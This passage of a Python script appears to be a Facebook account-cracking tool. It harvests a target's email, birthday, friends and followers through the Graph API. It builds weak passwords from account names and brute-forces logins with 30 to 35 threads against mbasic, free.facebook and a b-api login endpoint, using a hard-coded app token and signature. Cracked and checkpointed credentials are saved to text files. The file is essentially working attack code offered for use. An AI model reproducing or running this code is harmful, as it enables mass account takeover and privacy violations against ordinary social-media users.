        print('\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s '%(str(user), str(pw)))
        break
  except: pass

### INFO ACCOUNT ###

def target():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
		os.system("rm -rf login.txt")
		login()
	try:
		idt = input(k+"\n["+p+"•"+k+"]"+p+" ID Target        : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name Account     : "+op["name"]))
			print((k+"["+p+"•"+k+"]"+p+" Username         : "+op["username"]))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Email            : "+op["email"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Email            : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Date Of Birth    : "+op["birthday"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Date Of Birth    : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Gender           : "+op["gender"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Gender           : -"))
			try:
				r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
				id = []
				z = json.loads(r.text)
				qq = (op["first_name"]+".json").replace(" ","_")
				ys = open(qq , "w")
				for i in z["data"]:
					id.append(i["id"])
					ys.write(i["id"])
				ys.close()
				print((k+"["+p+"•"+k+"]"+p+" Total Friend     : %s"%(len(id))))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Total Friend     : -"))
			try:
				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
				id = []
				b = json.loads(a.text)
				bb = (op["first_name"]+".json").replace(" ","_")
				jw = open(bb , "w")
				for c in b["data"]:
					id.append(c["id"])
					jw.write(c["id"])
				jw.close()
				print((k+"["+p+"•"+k+"]"+p+" Total Follower   : %s"%(len(id))))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Total Follower   : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Website          : "+op["website"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Website          : -"))
			except IOError:
				print((k+"["+p+"•"+k+"]"+p+" Website          : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Update Time      : "+op["updated_time"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Update Time      : -"))
			except IOError:
				print((k+"["+p+"•"+k+"]"+p+" Update Time      : -"))
			input(k+"\n[ "+p+"Back"+k+" ]"+p)
			menu()
		except KeyError:
			input(k+"\n[ "+p+"Back"+k+" ]"+p)
			menu()
	except Exception as e:
		exit(k+"["+p+"•"+k+"]"+p+" Error : %s"%e)

### PASSWORD ###

def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"12345")
				results.append(i)
				if "indonesia" in ips:
					results.append("sayang")
					results.append("bismillah")
					results.append("anjing")
					results.append("123456")
	return results

### USER-AGENT ###

def defaultua():
    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError, IOError):
        logs()

def menu_user_agent():
    print("\n%s[%s1%s] %sGet User Agent"%(k,p,k,p))
    print("%s[%s2%s] %sChange User Agent"%(k,p,k,p))
    print("%s[%s3%s] %sRemove User Agent"%(k,p,k,p))
    print("%s[%s4%s] %sCheck User Agent"%(k,p,k,p))
    print("%s[%s0%s] %sBack"%(k,p,k,p))
    pilih_menu_user_agent()
    
def pilih_menu_user_agent():
    pmu = input("\n%s[%s•%s] %sChoose : "%(k,p,k,p))
    if pmu in[""]:
        print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
    elif pmu in["1","01"]:
        os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8')
        input(k+"\n[ "+p+"Back"+k+" ]"+p)
        menu()
    elif pmu in["2","02"]:
        change_ugent()
    elif pmu in["3","03"]:
        os.system("rm -rf ugent.txt")
        print("\n%s[%s!%s] %sUser Agent Was Removed"%(k,p,k,p))
        input(k+"\n[ "+p+"Back"+k+" ]"+p)
        menu()
    elif pmu in["4","04"]:
        check_ugent()
    elif pmu in["0","00"]:
        menu()
    else:
        print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))

def change_ugent():
    os.system("rm -rf ugent.txt")
    ua = input("\n%s[%s•%s] %sInput User Agent : \n\n%s"%(k,p,k,p,h))
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
        jalan("\n%s[%s•%s] %sSuccess Changed User Agent"%(h,p,h,p))
        input(k+"\n[ "+p+"Back"+k+" ]"+p)
        menu()
    except (KeyError, IOError):
        jalan("\n%s[%s•%s] %sFailed To Change User Agent"%(m,p,m,p))
        input(k+"\n[ "+p+"Back"+k+" ]"+p)
        menu()

def check_ugent():
    try:
        ungser = open('ugent.txt', 'r').read()
    except IOError:
        ungser = ("%s[%s!%s] %sUser Agent Not Found"%(k,p,k,p))
    except:pass
    print ("\n%s[%s•%s] %sYour User Agent : \n\n%s%s"%(k,p,k,p,h,ungser))
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()

### CRACK BRUTE ###

def mbasic(em,pas,hosts):
	ua = open('ugent.txt', 'r').read()
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

def ttll(em,pas,hosts):
	ua = open('ugent.txt', 'r').read()
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

def f_fb(em,pas,hosts):
	ua = open('ugent.txt', 'r').read()
	r=requests.Session()
	r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

class crack:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class crackttl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=ttll(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s • %s\x1b[0m   "%(fl.get("id"),i,str(ttl))))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class crackffb:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=f_fb(fl.get("id"),
					i,"https://free.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class bapi:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    print((k+"\n["+p+"•"+k+"]"+p+" Crack Password default/manual [d/m]"))
    while True:
      f=input(k+"["+p+"•"+k+"]"+p+" Pilihan : ")
      if f in[""," "]:
        print((k+"["+p+"!"+k+"]"+p+" Invalid Number"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        self.cp.append(username + " • " + password)
        print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s %s               "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

class bapittl:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
    while True:
      f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
      if f in[""," "]:
        print((k+"["+p+"!"+k+"]"+p+" Invalid Number"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        try:
          ke=requests.get("https://graph.facebook.com/"+str(username)+"?access_token="+open("login.txt","r").read())
          tt=json.loads(ke.text)
          ttl=tt["birthday"]
        except:pass
        self.cp.append(username + " • " + password + " • " + ttl)
        print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s • %s\x1b[0m   "%(username,password,ttl)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + " • "+ str(ttl)+"\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

### RESULT ###

def results(Dicky,Wahyudi):
        if len(Dicky) !=0:
                print(("[OK] : "+str(len(Dicky))))
        if len(Wahyudi) !=0:
                print(("[CP] : "+str(len(Wahyudi))))
        if len(Dicky) ==0 and len(Wahyudi) ==0:
                print("\n")
                print((k+"["+p+"!"+k+"]"+p+" No Result Found"))

def ress():
    os.system("clear")
    banner()
    print((k+"\n[ "+p+"Result Crack"+k+" ]"+p))
    print((k+"\n[ "+p+"OK"+k+" ]"+p))
    try:
        os.system("cat ok.txt")
    except IOError:
        print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
    print((k+"\n[ "+p+"CP"+k+" ]"+p))
    try:
        os.system("cat cp.txt")
    except IOError:
        print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()

if __name__=="__main__":
	os.system("git pull")
	menu()